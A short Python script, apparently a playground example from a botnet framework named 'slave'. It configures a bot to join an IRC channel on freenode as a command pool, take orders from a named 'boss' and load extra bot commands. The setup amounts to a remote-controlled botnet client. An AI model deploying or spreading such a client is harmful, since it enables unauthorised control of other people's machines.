from slave.playground.bots import BotInformation
from slave.lib.bots import BotBasic, BotV2

config = {
    'host': 'chat.freenode.net',
    'port': 6667,
    'channel': "#slavebotpool666",
    'boss_name': 'boss666',
    'bot_prefix': "SLAVEBOT"
}
BotInformation.read_config_from_dict(config)
BotInformation.use_other_bot_commands(BotV2)
BotInformation.start()